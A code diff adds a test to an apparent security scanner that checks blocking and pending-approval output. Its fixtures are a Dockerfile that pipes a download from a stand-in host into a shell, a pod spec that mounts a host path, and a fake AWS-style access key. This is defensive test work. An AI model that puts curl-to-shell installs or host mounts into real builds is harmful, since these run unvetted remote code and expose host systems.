@@ -84,3 +84,27 @@ it("reports version ranges as unresolved diagnostics rather than OSV advisories"
     await rm(root, { recursive: true, force: true });
   }
 }, 15000);
+
+it("exports pending approvals even when a separate finding blocks the aggregate gate", async () => {
+  const root = await mkdtemp(path.join(os.tmpdir(), "agentshield-receipt-"));
+  try {
+    await writeFile(
+      path.join(root, "Dockerfile"),
+      "FROM node:22\nRUN curl https://example.test/install | sh\n",
+    );
+    await writeFile(
+      path.join(root, "pod.yaml"),
+      "apiVersion: v1\nkind: Pod\nmetadata:\n  name: synthetic\nspec:\n  containers:\n    - name: app\n      image: node:22\n  volumes:\n    - name: host\n      hostPath:\n        path: /tmp\n",
+    );
+    await writeFile(path.join(root, "credentials.txt"), ["AKIA", "ABCDEFGHIJKLMNOP"].join(""));
+    const result = JSON.parse(await scan(root, "json")) as {
+      gate: string;
+      receipt: { approvalState: string; decisionCounts: { REQUIRE_APPROVAL: number } };
+    };
+    expect(result.gate).toBe("BLOCK");
+    expect(result.receipt.decisionCounts.REQUIRE_APPROVAL).toBeGreaterThan(0);
+    expect(result.receipt.approvalState).toBe("PENDING");
+  } finally {
+    await rm(root, { recursive: true, force: true });
+  }
+}, 15000);
